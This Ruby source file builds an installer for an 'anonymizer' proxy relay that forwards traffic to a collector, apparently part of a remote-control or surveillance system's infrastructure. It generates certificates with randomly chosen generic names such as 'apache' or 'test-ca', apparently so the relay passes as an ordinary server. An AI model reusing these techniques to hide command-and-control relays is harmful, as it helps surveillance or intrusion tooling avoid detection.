#
# Anonymizer installer creation
#

# from RCS::Common
require 'rcs-common/trace'

require 'archive/tar/minitar'

module RCS
module DB

class BuildAnon < Build
  include Archive::Tar

  def initialize
    super
    @platform = 'anon'
  end

  def melt(params)
    trace :debug, "Build: melt #{params}"

    # generate a new anon cert
    generate_anon_certificate

    # take the files needed for the communication with NC
    Dir.mkdir path('bbproxy/etc')
    FileUtils.cp path('anon.pem'), path('bbproxy/etc/certificate')
    FileUtils.cp Config.instance.cert('rcs-network.sig'), path('bbproxy/etc/signature')

    # the local port to listen on
    File.open(path('managerport'), 'wb') {|f| f.write params['port']}

    # retrieve the current collector
    coll = Collector.find(params['id'])
    if coll.good == false
      trace :warn, "Building an anonymizer with BAD status..."
      # write a fake version that is BAD for the collector check
      File.write(path('version'), "2014000000")
    end

    # write the anon config
    File.write(path('nexthop'), coll.config)

    trace :info, "Building anonymizer #{coll.address} with nexthop: #{coll.config}"

    # create the installer tar gz
    begin
      gz = Zlib::GzipWriter.new(File.open(path('install.tar.gz'), 'wb'))
      output = Minitar::Output.new(gz)

      h = {name: path('bbproxy/etc/certificate'), as: 'bbproxy/etc/certificate'}
      Minitar::pack_file(h, output)

      h = {name: path('bbproxy/etc/signature'), as: 'bbproxy/etc/signature'}
      Minitar::pack_file(h, output)

      h = {name: path('bbproxy/bbproxy'), as: 'bbproxy/bbproxy', mode: 0755}
      Minitar::pack_file(h, output)

      h = {name: path('version'), as: 'bbproxy/etc/version'}
      Minitar::pack_file(h, output)

      h = {name: path('managerport'), as: 'bbproxy/etc/managerport'}
      Minitar::pack_file(h, output)

      h = {name: path('nexthop'), as: 'bbproxy/etc/nexthop'}
      Minitar::pack_file(h, output)

      h = {name: path('bbproxy/init.d/bbproxy'), as: 'bbproxy/init.d/bbproxy', mode: 0755}
      Minitar::pack_file(h, output)

    ensure
      output.close
    end

    # prepend the install script
    sh = File.open(path('install.sh'), 'rb+') {|f| f.read}
    bin = File.open(path('install.tar.gz'), 'rb+') {|f| f.read}

    File.open(path('install'), 'wb') do |f|
      f.write sh
      f.write bin
    end

    @outputs = ['install']
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::File.open(path('output.zip'), Zip::File::CREATE) do |z|
      @outputs.each do |out|
        z.file.open(out, "w") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

  def unique(core)
    # nothing to do here...
  end

  def random_ca_name
    ['CA', 'ca', 'Root CA', 'root-ca', 'test-ca', 'test CA', 'my CA', 'ca_default'].sample
  end

  def random_name
    ['server', 'test', 'apache', 'nginx', 'development', 'web', 'www', 'Common Name', 'default', 'acme'].sample
  end

  def generate_anon_certificate
    trace :info, "Generating anon ssl certificates..."

    FileUtils.cp Config.instance.cert('openssl.cnf'), path('openssl.cnf')

    Dir.chdir path('') do

      File.open('index.txt', 'wb+') { |f| f.write '' }
      File.open('serial.txt', 'wb+') { |f| f.write '01' }

      trace :info, "Generating a new Anon CA authority..."
      subj = "/CN=\"#{random_ca_name}\""
      out = `openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-anon-ca.key -out rcs-anon-ca.crt -config openssl.cnf 2>&1`
      trace :debug, out

      raise('Missing file rcs-anon-ca.crt') unless File.exist? 'rcs-anon-ca.crt'

      trace :info, "Generating anonymizer certificate..."
      subj = "/CN=\"#{random_name}\""
      out = `openssl req -subj #{subj} -batch -days 3650 -nodes -new -keyout rcs-anon.key -out rcs-anon.csr -config openssl.cnf 2>&1`
      trace :debug, out

      raise('Missing file rcs-anon.key') unless File.exist? 'rcs-anon.key'
      raise('Missing file rcs-anon.csr') unless File.exist? 'rcs-anon.csr'

      trace :info, "Signing certificates..."
      out = `openssl ca -batch -days 3650 -out rcs-anon.crt -in rcs-anon.csr -config openssl.cnf -name CA_network 2>&1`
      trace :debug, out

      raise('Missing file rcs-anon.crt') unless File.exist? 'rcs-anon.crt'

      trace :info, "Creating certificates bundles..."

      # create the PEM file for all the collectors
      File.open('anon.pem', 'wb+') do |f|
        f.write File.read('rcs-anon.crt')
        f.write File.read('rcs-anon.key')
        f.write File.read('rcs-anon-ca.crt')
      end
    end
  end

end

end #DB::
end #RCS::
